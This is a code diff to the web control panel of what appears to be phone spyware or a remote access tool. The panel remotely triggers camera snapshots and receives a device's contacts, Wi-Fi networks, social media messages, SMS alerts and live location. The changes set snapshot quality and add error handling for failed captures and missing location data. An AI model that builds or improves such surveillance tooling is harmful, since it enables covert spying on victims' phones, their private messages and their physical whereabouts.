@@ -1700,7 +1700,7 @@
     </div>
     <div id="imagePreviewModal">
         <div class="preview-content">
-            <button class="preview-close" onclick="closeImagePreview()">✕</button>
+
             <img id="previewImg" src="">
         </div>
         <div class="preview-controls">
@@ -3478,8 +3478,22 @@
         function displaySmsKeywords(data) { }
         function displaySmsAlerts(data) { }
 
-        function capturePicture() { const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT', { camera, flash: document.getElementById('clickFlashCheckbox').checked }); }
+        function capturePicture() { 
+            const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value; 
+            sendCommand('CAMERA_SNAPSHOT', { 
+                camera, 
+                flash: document.getElementById('clickFlashCheckbox').checked,
+                width: 640,
+                height: 360,
+                quality: 360 
+            }); 
+        }
         function displayCapturedImage(b64) { 
+            if (!b64 || b64.trim() === "" || b64 === "null" || b64 === "undefined") {
+                showNotification('❌ Capture failed - No data received from device');
+                pushAlert('Camera', 'Snapshot failed due to low bandwidth or connection error');
+                return;
+            }
             openImagePreview(b64);
         }
 
@@ -3690,12 +3704,28 @@
                 case 'CONTACTS_DATA': try { displayContacts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'WIFI_NETWORKS_DATA': try { displayWifiNetworks(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
-                case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
+                case 'CAMERA_IMAGE': 
+                    if (!json.data) {
+                        showNotification('❌ Image capture failed - Remote device returned no data');
+                        pushAlert('Camera', 'Device failed to send image data (likely low bandwidth)');
+                    } else {
+                        displayCapturedImage(json.data); 
+                    }
+                    break;
                 case 'LOCATION_UPDATE':
                     try {
-                        const loc = typeof json.data === 'string' ? JSON.parse(json.data) : (json.data || json);
+                        const locData = json.data || json;
+                        if (!locData || (typeof locData === 'string' && locData === "null")) {
+                            console.warn('Location data is null');
+                            return;
+                        }
+                        const loc = typeof locData === 'string' ? JSON.parse(locData) : locData;
                         const lat = loc.lat || loc.latitude;
                         const lon = loc.lon || loc.longitude;
+                        if (!lat || !lon) {
+                            console.warn('Incomplete location data received');
+                            return;
+                        }
                         const acc = loc.accuracy || 10;
                         currentLocation = { lat, lon, acc };
 
